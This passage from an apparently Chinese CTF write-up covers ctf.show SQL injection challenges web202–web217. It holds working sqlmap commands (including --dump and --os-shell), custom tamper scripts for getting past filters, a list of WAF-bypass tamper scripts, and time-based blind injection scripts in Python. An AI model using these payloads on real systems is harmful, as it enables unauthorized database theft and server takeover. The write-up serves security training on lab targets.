$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;  </code></pre>

<p>那估计要使用 --data 指定 sqlmap 以 post 方式提交数据。</p>
<p>payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;0cebe0af-c76a-4335-a5a8-16064c4de582.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510162400623.png" alt="image-20220510162400623"></p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote>
<p>使用--method 调整sqlmap的请求方式</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;</code></pre>

<p>提示要用method改变请求方式，这里使用PUT请求，但是要记得加上设置<code>Content-Type</code>头，否则会变成表单提交</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;43ff4bac-b773-4dbb-a031-4e7733802d21.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session --method&#x3D;&quot;PUT&quot;
或者
sqlmap.py -u &quot;http:&#x2F;&#x2F;915e3532-dda5-47a4-82f4-b439e1cd6464.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><blockquote>
<p>使用--cookie 提交cookie数据</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;</code></pre>

<p>payload</p>
<p>加个cookie就行了</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3231bb16-ffbb-4679-a2ba-6a9687d737e4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;ctfshow&#x3D;64b77e9cb5917892ab53c4a2f6870182; PHPSESSID&#x3D;c2lm2vuriqmg16ilkbh2f9sern&quot; --method&#x3D;&quot;PUT&quot;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181243184.png" alt="image-20220510181243184"></p>
<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote>
<p>api调用需要鉴权</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,password from ctfshow_user where id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;
      </code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181851876.png" alt="image-20220510181851876"></p>
<p>每次查询都会调用一次getToken.php，这应该就是鉴权的过程</p>
<p>sqlmap中</p>
<pre class="language-none"><code class="language-none">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下
--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</code></pre>

<p>payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;9i0d9ub2ad7q4rl94r3pi9vf23&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510182857216.png" alt="image-20220510182857216"></p>
<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><blockquote>
<p>sql需要闭合</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;   </code></pre>

<p>sqlmap会自动给你把语句闭合的，所以可以继续用上一题的payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510183308961.png" alt="image-20220510183308961"></p>
<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote>
<p>--tamper 的初体验</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;</code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);
  &#125;</code></pre>

<p>过滤了空格</p>
<p>sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">举例如下tamper脚本：

apostrophemask.py 用utf8代替引号

equaltolike.py MSSQL * SQLite中like 代替等号

greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号

space2hash.py 空格替换为#号 随机字符串 以及换行符

space2comment.py 用&#x2F;**&#x2F;代替空格

apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号

halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤

space2mssqlblank.py mssql空格替换为其它空符号

base64encode.py 用base64编码

space2mssqlhash.py mssql查询中替换空格

modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释

space2mysqlblank.py mysql中空格替换其它空白符号

between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）

space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

multiplespaces.py 围绕SQL关键字添加多个空格

space2plus.py 用+替换空格

bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like

nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代

space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

chardoubleencode.py 双url编码(不处理以编码的)

unionalltounion.py 替换UNION ALL SELECT UNION SELECT

charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

unmagicquotes.py 宽字符绕过 GPC addslashes

randomcomments.py 用&#x2F;**&#x2F;分割sql关键字

charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码

securesphere.py 追加特制的字符串

versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过

halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</code></pre>

<p>对于本题，过滤了空格，我们可以使用tamper文件夹下的space2comment.py文件，payload为</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510222235981.png" alt="image-20220510222235981"></p>
<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><blockquote>
<p>-tamper 的2体验</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);
  function waf($str)&#123;
   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);
  &#125; </code></pre>

<p>select被替换为空白，但是这里只过滤了小写，而sqlmap里用的一般都是大写</p>
<pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223034551.png" alt="image-20220510223034551"></p>
<p>看，确实是大写的select</p>
<p>但是这道题是要考tamper脚本的编写</p>
<p>贴下y4师傅的</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/post/sqlmap-tamper/">https://y4er.com/post/sqlmap-tamper/</a></p>
<pre class="language-py" data-language="py"><code class="language-py">#!&#x2F;usr&#x2F;bin&#x2F;env python
&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;


from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW


def tamper(payload, **kwargs):
    payload &#x3D; space2comment(payload)
    return payload


def space2comment(payload):
    retVal &#x3D; payload
    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; chr(0x0a)
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; chr(0x0a)
                continue

            retVal +&#x3D; payload[i]

    return retVal
</code></pre>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><blockquote>
<p>--tamper 的3体验</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;TODO 未完工
   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);
  &#125;</code></pre>

<p>这题需要将空格和<code>*</code>，<code>=</code>替换，自己写一个tamper</p>
<p>(还没学会，我是废物www</p>
<pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python
&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW


def tamper(payload, **kwargs):
    payload &#x3D; space2comment(payload)
    return payload


def space2comment(payload):
    retVal &#x3D; payload
    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; chr(0x0a)
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot;*&quot;:
                retVal +&#x3D; chr(0x31)
                continue

            elif payload[i] &#x3D;&#x3D; &quot;&#x3D;&quot;:
                retVal +&#x3D; chr(0x0a)+&#39;like&#39;+chr(0x0a)
                continue

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; chr(0x0a)
                continue

            retVal +&#x3D; payload[i]

    return retVal
</code></pre>

<p>payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223906906.png" alt="image-20220510223906906"></p>
<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><blockquote>
<p>--tamper 的4体验</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密
  function decode($id)&#123;
    return strrev(base64_decode(strrev(base64_decode($id))));
  &#125;</code></pre>

<p>对内容先base64解码然后逆序再base64解码再逆序</p>
<p>tamper:</p>
<pre class="language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2021 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage(&quot;别套了别套了&quot;)

def tamper(payload, **kwargs):

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; retVal.encode()
        retVal &#x3D; retVal[::-1]
        retVal &#x3D; base64.b64encode(retVal)
        retVal &#x3D; retVal[::-1]
        retVal &#x3D; base64.b64encode(retVal)
        retVal &#x3D; retVal.decode()

    return retVal</code></pre>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>多过滤了一个空格</p>
<pre class="language-none"><code class="language-none">  function decode($id)&#123;
    return strrev(base64_decode(strrev(base64_decode($id))));
  &#125;
function waf($str)&#123;
    return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);
&#125;</code></pre>

<p>tamper</p>
<pre class="language-python" data-language="python"><code class="language-python">from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage(&quot;别套了别套了&quot;)

def tamper(payload, **kwargs):

    retVal &#x3D; payload

    retVal &#x3D; retVal.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;)
    retVal &#x3D; retVal.encode()
    retVal &#x3D; retVal[::-1]
    retVal &#x3D; base64.b64encode(retVal)
    retVal &#x3D; retVal[::-1]
    retVal &#x3D; base64.b64encode(retVal)
    retVal &#x3D; retVal.decode()

    return retVal</code></pre>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密
  function decode($id)&#123;
    return strrev(base64_decode(strrev(base64_decode($id))));
  &#125;
function waf($str)&#123;
    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);
&#125;</code></pre>

<p>比上一个又多过滤了一个星号</p>
<p>tamper：</p>
<pre class="language-none"><code class="language-none">from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage(&quot;别套了别套了&quot;)

def tamper(payload, **kwargs):
    payload &#x3D; bypass(payload)

    retVal &#x3D; payload
    retVal &#x3D; retVal.encode()
    retVal &#x3D; retVal[::-1]
    retVal &#x3D; base64.b64encode(retVal)
    retVal &#x3D; retVal[::-1]
    retVal &#x3D; base64.b64encode(retVal)
    retVal &#x3D; retVal.decode()

    return retVal

def bypass(payload):
    retVal &#x3D; &quot;&quot;
    for i in range(len(payload)):
        if payload[i]&#x3D;&#x3D;&quot; &quot;:
            retVal +&#x3D; chr(0x9)
        else:
            retVal +&#x3D; payload[i]
    return retVal</code></pre>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>这一题flag不在数据库中，因此需要利用–os-shell进行getshell</p>
<blockquote>
<p><strong>–os-shell</strong> 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p>
<p>在mysql中，由 <strong>secure_file_priv</strong> 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密
  function decode($id)&#123;
    return strrev(base64_decode(strrev(base64_decode($id))));
  &#125;</code></pre>

<p>payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshowweb213 --os-shell</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510225713255.png" alt="image-20220510225713255"></p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>时间盲注，跑脚本就行了</p>
<p>懒得写了，抄一下作业</p>
<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot;

result &#x3D; &quot;&quot;
i &#x3D; 0
while True:
    i &#x3D; i + 1
    head &#x3D; 32
    tail &#x3D; 127

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        # 查数据库
        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        # 查列名字-id.flag
        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot;
        # 查数据
        payload &#x3D; &quot;select flaga from ctfshow_flagx&quot;
        data &#x3D; &#123;
            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
            tail &#x3D; mid
        except Exception as e:
            head &#x3D; mid + 1

    if head !&#x3D; 32:
        result +&#x3D; chr(head)
    else:
        break
    print(result)
</code></pre>

<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>用了单引号，也就是变成字符型注入了，记得闭合就行</p>
<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show&#x2F;api&#x2F;&quot;

result &#x3D; &quot;&quot;
i &#x3D; 0
while True:
    i &#x3D; i + 1
    head &#x3D; 32
    tail &#x3D; 127

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        # 查数据库
        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        # 查列名字-id.flag
        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxc&#39;&quot;
        # 查数据
        payload &#x3D; &quot;select flagaa from ctfshow_flagxc&quot;
        data &#x3D; &#123;
            &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;&#x3D;&#39;1&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
            tail &#x3D; mid
        except Exception as e:
            head &#x3D; mid + 1

    if head !&#x3D; 32:
        result +&#x3D; chr(head)
    else:
        break
    print(result)
</code></pre>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><pre class="language-none"><code class="language-none">where id &#x3D; from_base64($id);</code></pre>

<p>查询语句变成了这样</p>
<p>这题不能将base64编码之后的字符串作为payload传入，因为base64解码之后，SQL会当做一个字符串而不是一个语句</p>
<p>尝试闭合这个base64解码</p>
<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show&#x2F;api&#x2F;&quot;

result &#x3D; &quot;&quot;
i &#x3D; 0
while True:
    i &#x3D; i + 1
    head &#x3D; 32
    tail &#x3D; 127

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        # 查数据库
        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        # 查列名字-id.flag
        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcc&#39;&quot;
        # 查数据
        payload &#x3D; &quot;select flagaac from ctfshow_flagxcc&quot;
        data &#x3D; &#123;
            &#39;ip&#39;: f&quot;&#39;MQ&#x3D;&#x3D;&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
            tail &#x3D; mid
        except Exception as e:
            head &#x3D; mid + 1

    if head !&#x3D; 32:
        result +&#x3D; chr(head)
    else:
        break
    print(result)
</code></pre>

<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">where id &#x3D; ($id);
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;屏蔽危险分子
function waf($str)&#123;
    return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str);
&#125;   </code></pre>

<p>过滤了sleep，但是还有一个benchmark函数</p>
<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能<br>套神的测试：</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510231229494.png" alt="image-20220510231229494"></p>
<p>但是这个误差会很大</p>
<p>运行一次md5的时间可太短了，但是benchmark就是运行114514 1145140次md5计算出来的时间</p>
<p>值得注意的是，时间是指客户端的经过时间，不是在服务器端的CPU时间。</p>
<p>因此这个在注入的时候，和服务器跟网速有关</p>
<p>可以借鉴了feng师傅的思路,使用了time.sleep函数使每请求一次延迟0.2秒，提高准确率，且每爆出一个字母后就再延迟1.2秒，以免服务器卡顿，这样每条请求之间间隔一定的时间，虽然爆起来比较慢，但是准确率可以说是100%，不至于受到服务器和网速的影响。</p>
